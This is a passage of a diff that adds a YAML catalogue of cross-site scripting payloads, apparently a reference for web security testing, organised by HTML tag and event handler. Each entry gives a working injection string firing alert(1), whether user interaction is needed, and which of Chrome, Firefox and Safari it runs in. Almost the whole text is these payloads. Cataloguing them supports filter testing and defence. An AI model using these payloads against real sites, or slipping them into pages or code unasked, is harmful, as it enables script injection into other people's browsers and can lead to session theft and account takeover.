+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+frameset:
+  onbeforecopy:
+    payloads:
+    - <frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <frameset onbeforecut="alert(1)" contenteditable>test</frameset>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <frameset id=x tabindex=1 onfocus=alert(1)></frameset>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpageshow:
+    payloads:
+    - <frameset onpageshow=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <frameset onpaste="alert(1)" contenteditable>test</frameset>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+h1:
+  onbeforecopy:
+    payloads:
+    - <h1 onbeforecopy="alert(1)" contenteditable>test</h1>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <h1 onbeforecut="alert(1)" contenteditable>test</h1>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <h1 id=x tabindex=1 onfocus=alert(1)></h1>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <h1 id=x tabindex=1 onfocusin=alert(1)></h1>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <h1 onpaste="alert(1)" contenteditable>test</h1>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+head:
+  onbeforecopy:
+    payloads:
+    - <head onbeforecopy="alert(1)" contenteditable style=display:block>test</head>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <head onbeforecut="alert(1)" contenteditable style=display:block>test</head>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <head id=x tabindex=1 onfocus=alert(1) style=display:block></head>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <head id=x tabindex=1 onfocusin=alert(1) style=display:block></head>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <head onpaste="alert(1)" contenteditable style=display:block>test</head>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+header:
+  onbeforecopy:
+    payloads:
+    - <header onbeforecopy="alert(1)" contenteditable>test</header>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <header onbeforecut="alert(1)" contenteditable>test</header>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <header id=x tabindex=1 onfocus=alert(1)></header>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <header id=x tabindex=1 onfocusin=alert(1)></header>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <header onpaste="alert(1)" contenteditable>test</header>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+hgroup:
+  onbeforecopy:
+    payloads:
+    - <hgroup onbeforecopy="alert(1)" contenteditable>test</hgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <hgroup onbeforecut="alert(1)" contenteditable>test</hgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <hgroup onpaste="alert(1)" contenteditable>test</hgroup>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+hr:
+  onbeforecopy:
+    payloads:
+    - <hr onbeforecopy="alert(1)" contenteditable>test</hr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <hr onbeforecut="alert(1)" contenteditable>test</hr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <hr id=x tabindex=1 onfocus=alert(1)></hr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <hr id=x tabindex=1 onfocusin=alert(1)></hr>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <hr onpaste="alert(1)" contenteditable>test</hr>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+html:
+  onbeforecopy:
+    payloads:
+    - <html onbeforecopy="alert(1)" contenteditable>test</html>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <html onbeforecut="alert(1)" contenteditable>test</html>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <html id=x tabindex=1 onfocus=alert(1)></html>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <html id=x tabindex=1 onfocusin=alert(1)></html>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <html onpaste="alert(1)" contenteditable>test</html>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+i:
+  onbeforecopy:
+    payloads:
+    - <i onbeforecopy="alert(1)" contenteditable>test</i>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <i onbeforecut="alert(1)" contenteditable>test</i>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <i id=x tabindex=1 onfocus=alert(1)></i>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <i id=x tabindex=1 onfocusin=alert(1)></i>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <i onpaste="alert(1)" contenteditable>test</i>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+iframe:
+  onbeforecopy:
+    payloads:
+    - <iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <iframe onbeforecut="alert(1)" contenteditable>test</iframe>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <iframe id=x onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onfocusin:
+    payloads:
+    - <iframe id=x onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onload:
+    payloads:
+    - <iframe onload=alert(1)></iframe>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <iframe onpaste="alert(1)" contenteditable>test</iframe>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+iframe2:
+  onfocus:
+    payloads:
+    - <iframe autofocus onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+  onfocusin:
+    payloads:
+    - <iframe autofocus onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+image:
+  onbeforecopy:
+    payloads:
+    - <image onbeforecopy="alert(1)" contenteditable>test</image>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <image onbeforecut="alert(1)" contenteditable>test</image>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <image src/onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <image id=x tabindex=1 onfocus=alert(1)></image>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <image id=x tabindex=1 onfocusin=alert(1)></image>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <image src=validimage.png onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onloadend:
+    payloads:
+    - <image src=validimage.png onloadend=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onloadstart:
+    payloads:
+    - <image src=validimage.png onloadstart=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onpaste:
+    payloads:
+    - <image onpaste="alert(1)" contenteditable>test</image>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+image2:
+  onerror:
+    payloads:
+    - <image srcset=1 onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onload:
+    payloads:
+    - <picture><source srcset="validimage.png"><image onload=alert(1)></picture>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onloadend:
+    payloads:
+    - <picture><source srcset="validimage.png"><image onloadend=alert(1)></picture>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onloadstart:
+    payloads:
+    - <picture><source srcset="validimage.png"><image onloadstart=alert(1)></picture>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+image3:
+  onerror:
+    payloads:
+    - <svg><image href=1 onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onload:
+    payloads:
+    - <svg><image href=validimage.png onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+img:
+  onbeforecopy:
+    payloads:
+    - <img onbeforecopy="alert(1)" contenteditable>test</img>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <img onbeforecut="alert(1)" contenteditable>test</img>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <img src/onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <img id=x tabindex=1 onfocus=alert(1)></img>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <img id=x tabindex=1 onfocusin=alert(1)></img>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <img src=validimage.png onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onloadend:
+    payloads:
+    - <img src=validimage.png onloadend=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onloadstart:
+    payloads:
+    - <img src=validimage.png onloadstart=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onpaste:
+    payloads:
+    - <img onpaste="alert(1)" contenteditable>test</img>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+img2:
+  onerror:
+    payloads:
+    - <img srcset=1 onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onload:
+    payloads:
+    - <img srcset=validimage.png onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onloadend:
+    payloads:
+    - <picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onloadstart:
+    payloads:
+    - <picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+input:
+  onauxclick:
+    payloads:
+    - <input onauxclick=alert(1)>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+  onbeforecopy:
+    payloads:
+    - <input onbeforecopy=alert(1) value="XSS" autofocus>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <input onbeforecut=alert(1) value="XSS" autofocus>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onchange:
+    payloads:
+    - <input onchange=alert(1) value=xss>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onerror:
+    payloads:
+    - <input type=image src=1 onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <input autofocus onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocusin:
+    payloads:
+    - <input autofocus onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oninput:
+    payloads:
+    - <input oninput=alert(1) value=xss>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  oninvalid:
+    payloads:
+    - <form><input oninvalid=alert(1) required><input type=submit>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onload:
+    payloads:
+    - <input type=image src=validimage.png onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onloadend:
+    payloads:
+    - <input type=image onloadend=alert(1) src=validimage.png>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onloadstart:
+    payloads:
+    - <input type=image onloadstart=alert(1) src=validimage.png>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onpaste:
+    payloads:
+    - <input onpaste=alert(1) value="" autofocus>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onsearch:
+    payloads:
+    - <form><input type=search onsearch=alert(1) value="Hit return" autofocus>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+  onselect:
+    payloads:
+    - <input onselect=alert(1) value="XSS" autofocus>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+input2:
+  onfocus:
+    payloads:
+    - <input id=x onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <input id=x onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+input3:
+  onfocus:
+    payloads:
+    - <input type=checkbox id=x onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <input type=checkbox id=x onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+input4:
+  onfocus:
+    payloads:
+    - <input type=radio id=x onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <input type=radio id=x onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+ins:
+  onbeforecopy:
+    payloads:
+    - <ins onbeforecopy="alert(1)" contenteditable>test</ins>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <ins onbeforecut="alert(1)" contenteditable>test</ins>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <ins id=x tabindex=1 onfocus=alert(1)></ins>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <ins id=x tabindex=1 onfocusin=alert(1)></ins>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <ins onpaste="alert(1)" contenteditable>test</ins>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+kbd:
+  onbeforecopy:
+    payloads:
+    - <kbd onbeforecopy="alert(1)" contenteditable>test</kbd>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <kbd onbeforecut="alert(1)" contenteditable>test</kbd>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <kbd id=x tabindex=1 onfocus=alert(1)></kbd>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <kbd onpaste="alert(1)" contenteditable>test</kbd>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+keygen:
+  onbeforecopy:
+    payloads:
+    - <keygen onbeforecopy="alert(1)" contenteditable>test</keygen>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <keygen onbeforecut="alert(1)" contenteditable>test</keygen>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <keygen autofocus onfocus=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+    - safari
+  onfocusin:
+    payloads:
+    - <keygen autofocus onfocusin=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+    - safari
+  onpaste:
+    payloads:
+    - <keygen onpaste="alert(1)" contenteditable>test</keygen>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+label:
+  onbeforecopy:
+    payloads:
+    - <label onbeforecopy="alert(1)" contenteditable>test</label>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <label onbeforecut="alert(1)" contenteditable>test</label>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <label id=x tabindex=1 onfocus=alert(1)></label>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <label id=x tabindex=1 onfocusin=alert(1)></label>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <label onpaste="alert(1)" contenteditable>test</label>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+legend:
+  onbeforecopy:
+    payloads:
+    - <legend onbeforecopy="alert(1)" contenteditable>test</legend>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <legend onbeforecut="alert(1)" contenteditable>test</legend>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <legend id=x tabindex=1 onfocus=alert(1)></legend>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <legend id=x tabindex=1 onfocusin=alert(1)></legend>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <legend onpaste="alert(1)" contenteditable>test</legend>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+li:
+  onbeforecopy:
+    payloads:
+    - <li onbeforecopy="alert(1)" contenteditable>test</li>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <li onbeforecut="alert(1)" contenteditable>test</li>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <li id=x tabindex=1 onfocus=alert(1)></li>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <li id=x tabindex=1 onfocusin=alert(1)></li>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <li onpaste="alert(1)" contenteditable>test</li>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+link:
+  onerror:
+    payloads:
+    - <link rel=stylesheet href=1 onerror=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <link onfocus=alert(1) id=x tabindex=1 style=display:block>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <link onfocusin=alert(1) id=x tabindex=1 style=display:block>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onload:
+    payloads:
+    - <link href=validstyles.css rel=stylesheet onload=alert(1)>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - firefox
+    - safari
+listing:
+  onbeforecopy:
+    payloads:
+    - <listing onbeforecopy="alert(1)" contenteditable>test</listing>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <listing onbeforecut="alert(1)" contenteditable>test</listing>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <listing id=x tabindex=1 onfocus=alert(1)></listing>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <listing id=x tabindex=1 onfocusin=alert(1)></listing>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <listing onpaste="alert(1)" contenteditable>test</listing>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+main:
+  onbeforecopy:
+    payloads:
+    - <main onbeforecopy="alert(1)" contenteditable>test</main>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <main onbeforecut="alert(1)" contenteditable>test</main>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <main id=x tabindex=1 onfocus=alert(1)></main>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <main id=x tabindex=1 onfocusin=alert(1)></main>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <main onpaste="alert(1)" contenteditable>test</main>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+map:
+  onbeforecopy:
+    payloads:
+    - <map onbeforecopy="alert(1)" contenteditable>test</map>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <map onbeforecut="alert(1)" contenteditable>test</map>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <map id=x tabindex=1 onfocus=alert(1)></map>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <map id=x tabindex=1 onfocusin=alert(1)></map>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <map onpaste="alert(1)" contenteditable>test</map>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+mark:
+  onbeforecopy:
+    payloads:
+    - <mark onbeforecopy="alert(1)" contenteditable>test</mark>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <mark onbeforecut="alert(1)" contenteditable>test</mark>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <mark id=x tabindex=1 onfocus=alert(1)></mark>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <mark id=x tabindex=1 onfocusin=alert(1)></mark>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <mark onpaste="alert(1)" contenteditable>test</mark>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+marquee:
+  onbeforecopy:
+    payloads:
+    - <marquee onbeforecopy="alert(1)" contenteditable>test</marquee>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <marquee onbeforecut="alert(1)" contenteditable>test</marquee>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbounce:
+    payloads:
+    - <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onfinish:
+    payloads:
+    - <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+  onfocus:
+    payloads:
+    - <marquee id=x tabindex=1 onfocus=alert(1)></marquee>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <marquee onpaste="alert(1)" contenteditable>test</marquee>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onstart:
+    payloads:
+    - <marquee onstart=alert(1)>XSS</marquee>
+    required: []
+    interaction: false
+    browsers:
+    - firefox
+menu:
+  onbeforecopy:
+    payloads:
+    - <menu onbeforecopy="alert(1)" contenteditable>test</menu>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <menu onbeforecut="alert(1)" contenteditable>test</menu>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <menu id=x tabindex=1 onfocus=alert(1)></menu>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <menu id=x tabindex=1 onfocusin=alert(1)></menu>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <menu onpaste="alert(1)" contenteditable>test</menu>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onshow:
+    payloads:
+    - <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
+    required: []
+    interaction: true
+    browsers:
+    - firefox
+menuitem:
+  onbeforecopy:
+    payloads:
+    - <menuitem onbeforecopy="alert(1)" contenteditable>test</menuitem>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <menuitem onbeforecut="alert(1)" contenteditable>test</menuitem>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <menuitem onpaste="alert(1)" contenteditable>test</menuitem>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+meta:
+  onbeforecopy:
+    payloads:
+    - <meta onbeforecopy="alert(1)" contenteditable style=display:block>test</meta>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <meta onbeforecut="alert(1)" contenteditable style=display:block>test</meta>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
+    - <meta id=x tabindex=1 onfocus=alert(1) style=display:block></meta>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onfocusin:
+    payloads:
+    - <meta id=x tabindex=1 onfocusin=alert(1) style=display:block></meta>
+    required: []
+    interaction: false
+    browsers:
+    - chrome
+    - safari
+  onpaste:
+    payloads:
+    - <meta onpaste="alert(1)" contenteditable style=display:block>test</meta>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+meter:
+  onbeforecopy:
+    payloads:
+    - <meter onbeforecopy="alert(1)" contenteditable>test</meter>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onbeforecut:
+    payloads:
+    - <meter onbeforecut="alert(1)" contenteditable>test</meter>
+    required: []
+    interaction: true
+    browsers:
+    - chrome
+    - firefox
+    - safari
+  onfocus:
+    payloads:
